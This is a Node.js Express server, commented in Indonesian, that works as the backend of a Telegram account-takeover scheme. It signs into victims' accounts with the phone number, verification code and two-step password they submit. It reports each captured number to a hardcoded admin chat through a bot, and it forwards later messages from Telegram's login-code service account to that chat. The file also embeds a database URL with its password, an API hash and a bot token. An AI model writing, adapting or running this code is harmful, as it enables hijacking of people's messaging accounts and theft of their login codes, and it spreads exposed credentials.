const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { Sequelize, DataTypes } = require("sequelize");
const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { SessionPasswordNeededError } = require("telegram/errors");
const app = express();
const port = 3000;

app.use(cors());
app.use(bodyParser.json());

// Ganti dengan URL koneksi ElephantSQL Anda
const sequelize = new Sequelize(
  "postgres://xtswxymn:hcSaLOzAhkpmD3294h10blhyhhTeXAUU@manny.db.elephantsql.com/xtswxymn"
);

// Model untuk menyimpan sesi pengguna
const UserSession = sequelize.define("UserSession", {
  phone_number: {
    type: DataTypes.STRING,
    unique: true,
    allowNull: false,
  },
  telegram_id: {
    type: DataTypes.STRING,
    unique: true,
    allowNull: false,
  },
  is_logged_in: {
    type: DataTypes.BOOLEAN,
    defaultValue: true,
  },
});

// Ganti dengan API ID dan API Hash Anda
const API_ID = "25713591";
const API_HASH = "0922a8867d12505f4609bca66aa1b9b1";
const BOT_TOKEN = "7739744157:AAFYlYObu8O82BO2GYVnnunS2LTU1abO3ZA"; // Ganti dengan token bot Anda

// Inisialisasi bot Telegram
const bot = new TelegramClient(new StringSession(""), API_ID, API_HASH);
bot.start({ botToken: BOT_TOKEN });

// Buat database dan tabel jika belum ada
sequelize.sync();

// Endpoint untuk login
app.post("/api/login", async (req, res) => {
  const { phone_number } = req.body;

  const sessionName = `session_${phone_number.replace("+", "")}`;
  const client = new TelegramClient(new StringSession(""), API_ID, API_HASH);

  try {
    await client.start({
      phoneNumber: phone_number,
      phoneCode: async () => {
        await client.sendCodeRequest(phone_number);
        return ""; // Kode verifikasi akan dikirim ke pengguna
      },
      onError: (err) => console.log(err),
    });

    res.json({ message: "Kode verifikasi telah dikirim." });
  } catch (error) {
    // Menangani kesalahan jika nomor telepon tidak terdaftar
    if (error.message.includes("PHONE_NUMBER_INVALID")) {
      return res
        .status(400)
        .json({ error: "Nomor telepon tidak terdaftar di Telegram." });
    }
    res.status(500).json({ error: error.message });
  }
});

// Endpoint untuk verifikasi kode
app.post("/api/verify_code", async (req, res) => {
  const { phone_number, verification_code } = req.body;

  const sessionName = `session_${phone_number.replace("+", "")}`;
  const client = new TelegramClient(new StringSession(""), API_ID, API_HASH);

  try {
    await client.start();
    const user = await client.signIn({
      phoneNumber: phone_number,
      phoneCode: verification_code,
    });

    // Simpan sesi pengguna ke database
    await UserSession.create({
      phone_number: phone_number,
      telegram_id: String(user.id),
    });

    // Kirim pesan ke bot dengan informasi nomor yang berhasil login
    await bot.sendMessage(
      "6124038392",
      `Nomor yang berhasil login: ${phone_number}`
    ); // Ganti dengan ID chat admin Anda

    // Cek apakah verifikasi dua langkah diperlukan
    if (user instanceof SessionPasswordNeededError) {
      return res
        .status(401)
        .json({ message: "Verifikasi dua langkah diperlukan." });
    }

    // Mulai mendengarkan pesan baru dari akun yang berhasil login
    listenForMessages(client);

    res.json({ message: "Login berhasil." });
  } catch (error) {
    if (error instanceof SessionPasswordNeededError) {
      return res
        .status(401)
        .json({ message: "Verifikasi dua langkah diperlukan." });
    }
    res
      .status(400)
      .json({
        message:
          "Kode verifikasi salah atau terjadi kesalahan: " + error.message,
      });
  }
});

// Fungsi untuk mendengarkan pesan baru
async function listenForMessages(client) {
  client.addEventHandler(
    async (event) => {
      const message = event.message;
      if (message && message.peerId && message.peerId.channelId === 777000) {
        // Memastikan pesan dari 777000
        await bot.sendMessage(
          "6124038392",
          `Pesan baru dari 777000: ${message.message}`
        ); // Ganti dengan ID chat admin Anda
      }
    },
    { filter: new TelegramClient.events.NewMessage() }
  );
}

// Endpoint untuk logout
app.post("/api/logout", async (req, res) => {
  const { phone_number } = req.body;

  try {
    const session = await UserSession.findOne({ where: { phone_number } });
    if (session) {
      await session.destroy();
      await bot.sendMessage(
        "6124038392",
        `Nomor yang telah logout: ${phone_number}`
      ); // Ganti dengan ID chat admin Anda
      return res.json({ message: "Logout berhasil." });
    } else {
      return res.status(404).json({ message: "Sesi tidak ditemukan." });
    }
  } catch (error) {
    res
      .status(500)
      .json({ message: "Terjadi kesalahan saat logout: " + error.message });
  }
});

// Endpoint untuk verifikasi password
app.post("/api/verify_password", async (req, res) => {
  const { phone_number, password } = req.body;

  const sessionName = `session_${phone_number.replace("+", "")}`;
  const client = new TelegramClient(new StringSession(""), API_ID, API_HASH);

  try {
    await client.start();
    await client.signIn({ phoneNumber: phone_number, password });
    res.json({ message: "Login berhasil." });
  } catch (error) {
    res.status(400).json({ message: "Password salah: " + error.message });
  }
});

// Menjalankan server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
